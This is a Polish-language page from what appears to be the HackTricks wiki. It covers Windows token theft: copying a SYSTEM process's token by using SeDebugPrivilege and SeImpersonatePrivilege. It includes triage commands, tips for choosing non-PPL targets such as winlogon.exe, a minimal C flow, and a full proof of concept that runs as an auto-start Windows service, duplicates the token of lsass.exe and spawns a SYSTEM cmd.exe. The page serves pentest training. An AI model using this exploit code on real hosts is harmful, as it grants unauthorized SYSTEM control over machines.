# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Ta strona opisuje wariant **manual token-theft**, w którym kontekst **High Integrity** mający już **`SeDebugPrivilege`** i **`SeImpersonatePrivilege`** otwiera odpowiedni proces **SYSTEM**, **duplikuje jego token** i **uruchamia nowy proces** z tym tokenem.

Jeśli potrzebujesz tylko szybkiej powłoki `SYSTEM` z uprzywilejowanego procesu admina, sprawdź też:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Jeśli nie masz ścieżki przez uchwyt procesu, ale masz **`SeImpersonatePrivilege`**, zwykle łatwiejsza jest droga **named-pipe / Potato**:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

Zanim spróbujesz ścieżki kopiowania tokenu, potwierdź, że bieżący proces jest już w użytecznym kontekście:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Uwagi:

- **`SeDebugPrivilege`** pozwala otwierać wiele **niechronionych** procesów SYSTEM, nawet jeśli ich DACL normalnie by cię blokował.
- **`SeImpersonatePrivilege`** sprawia, że **`CreateProcessWithTokenW`** jest potem praktyczne.
- Jeśli ścieżka kopiowania tokena daje tylko słaby albo filtrowany token SYSTEM, po prostu ukradnij token z **innego procesu SYSTEM**.

## Wybierz proces docelowy ostrożnie

Technika jest zwykle pokazywana na **`lsass.exe`**, ale na nowoczesnym Windows to często **zły cel**:

- Jeśli **LSA Protection / RunAsPPL** jest włączone, **`lsass.exe`** jest chroniony i zwykły proces admina z `SeDebugPrivilege` nadal nie będzie mógł go otworzyć.
- Preferuj **nie-PPL procesy SYSTEM** takie jak **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** albo wczesną instancję **`svchost.exe`**.
- **Protected processes** i niektóre specjalne procesy, takie jak **`System`** albo **`csrss.exe`**, nie są realistycznymi celami user-mode dla tej techniki.
- Użyj **Process Hacker / Process Explorer** uruchomionego z podniesionymi uprawnieniami, aby sprawdzić, czy token celu faktycznie ma potrzebne privilegia, zanim go zduplikujesz.

## Szczegóły API, które mają znaczenie w praktyce

Wiele publicznych PoC używa **`PROCESS_ALL_ACCESS`** i **`TOKEN_ALL_ACCESS`**, ale to jest bardziej hałaśliwe niż trzeba. W praktyce:

- Otwórz proces docelowy tylko z prawami, których potrzebujesz (zwykle **`PROCESS_QUERY_INFORMATION`** albo **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Otwórz token z prawami potrzebnymi do tworzenia procesu: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Użyj **`DuplicateTokenEx(..., TokenPrimary, ...)`**, aby utworzyć **primary token**; sam impersonation token nie wystarczy do utworzenia nowego procesu.
- Jeśli **`CreateProcessWithTokenW`** zwraca błąd **`1314`**, przełącz się na **`CreateProcessAsUserW`**.
- Jeśli uruchamiasz z **usługi / Session 0**, pamiętaj, że **`CreateProcessWithTokenW`** zostawia proces potomny w **sesji wywołującego**. Jeśli potrzebujesz widocznej powłoki desktopowej, użyj **`CreateProcessAsUserW`** i przenieś token do żądanej sesji.

Minimalny nowoczesny flow wygląda tak:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

Poniższy kod **wykorzystuje uprawnienia `SeDebugPrivilege` i `SeImpersonatePrivilege`** do skopiowania tokena z **procesu działającego jako SYSTEM** i z **wszystkimi uprawnieniami tokena**. W tym przypadku kod można skompilować i użyć jako **binary usługi Windows**, aby zweryfikować, że primitive działa.

Główna część **code, w której następuje podniesienie uprawnień**, znajduje się wewnątrz funkcji **`Exploit`**. W tej funkcji widać, że wyszukiwany jest **`lsass.exe`**, jego **token jest kopiowany**, a następnie ten token jest używany do uruchomienia nowego **`cmd.exe`** ze wszystkimi uprawnieniami skopiowanego tokena.

Na nowoczesnych hostach często będziesz chciał zastąpić **`lsass.exe`** innym **non-PPL SYSTEM process**, takim jak **`winlogon.exe`**, **`wininit.exe`** lub **`services.exe`**.

Inne procesy działające jako SYSTEM ze wszystkimi lub większością uprawnień tokena to: **`services.exe`**, **`svchost.exe`** (niektóre z pierwszych), **`wininit.exe`**, **`csrss.exe`**... Pamiętaj, że zwykle **nie będziesz w stanie skopiować tokena z protected process**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Referencje

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
